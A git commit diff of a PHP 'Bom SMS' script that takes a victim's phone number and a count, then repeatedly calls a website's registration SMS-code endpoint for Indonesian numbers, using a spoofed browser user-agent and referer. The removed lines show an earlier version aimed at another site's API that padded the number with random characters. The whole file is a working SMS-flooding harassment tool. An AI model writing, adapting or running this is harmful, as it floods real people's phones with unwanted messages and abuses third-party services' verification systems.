0d7552d5289412ba9ca06b4c296ed0171d34a0f7
Peking <67999065+peking707@users.noreply.github.com>
2021-02-07 14:18:07 +0000

    Update run.php

--- run.php
+++ run.php
@@ -1,42 +1,21 @@
-<?php 
-function curl($url, $ua, $data = null){
+<?php
+function curl($url, $ua, $nmr = null){
 	$ch = curl_init();
-	curl_setopt($ch, CURLOPT_URL, $url);
+	curl_setopt($ch, CURLOPT_URL, "https://www.sharedmp.com/api/sms/send?event=register&mobile=".$nmr."&area_code=62" );
 	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
 curl_setopt($ch, CURLOPT_COOKIEFILE, 'cok.txt');
 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 	curl_setopt($ch, CURLOPT_POST, 1);
 	curl_setopt($ch, CURLOPT_HTTPHEADER, $ua);
 	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
 	$result = curl_exec($ch);
 	return $result;
 }
-function random($length = 5){
-    $characters = '+++++++++++++';
-    $charactersLength = strlen($characters);
-    $randomString = '';
-    for ($i = 0; $i < $length; $i++) {
-        $randomString .= $characters[rand(0, $charactersLength - 1)];
-    }
-    return $randomString;
-}
-function random2($length = 3){
-    $characters = '.+.+..+..++.+..+..++..++..';
-    $charactersLength = strlen($characters);
-    $randomString = '';
-    for ($i = 0; $i < $length; $i++) {
-        $randomString .= $characters[rand(0, $charactersLength - 1)];
-    }
-    return $randomString;
-}
-
 $ua = array(
-"user-agent: Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36",
+"user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-J500G Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36",
 "content-type: application/x-www-form-urlencoded",
-"referer: https://www.shendas.com/id/",
+"referer: https://www.sharedmp.com/h5/pages/register/register?invcode=170835",
     );
-    
 echo "
 ╭━━━╮╱╱╭╮╱╱╱╱╱╱╱╱╭╮╱╭┳━━━┳╮╱╭╮
 ┃╭━╮┃╱╱┃┃╱╱╱╱╱╱╱╱┃┃╱┃┃╭━╮┃┃╱┃┃
@@ -47,17 +26,13 @@ echo "
 ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
 ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯Bom SMS";
 
-echo "\n\n[+]Nomor?  [Jangan 62/08]";
+echo "\n\n[+]Nomor [Jangan pake 62/0]: ";
 $nmr = trim(fgets(STDIN));
-echo "[+]Brapa?  ";
+echo "[+]Brapa?:  ";
 $brp = trim(fgets(STDIN));
 echo "\n";
 for ($i = 0; $i < $brp; $i++){
-$ran = random();
-$ran2 = random2();
-$data = "phone=8$ran^$ran2>$ran2/$nmr&dest=62&code=8748&recommend=6033306&code_rand=1612725492763&lang=id";
-$send = curl("https://www.shendas.com/api/sms/sendSMSCode", $ua, $data);
-echo "$send\n";
-
+$gas = curl($a, $ua, $nmr);
+echo "$gas\n";
 }
 ?>
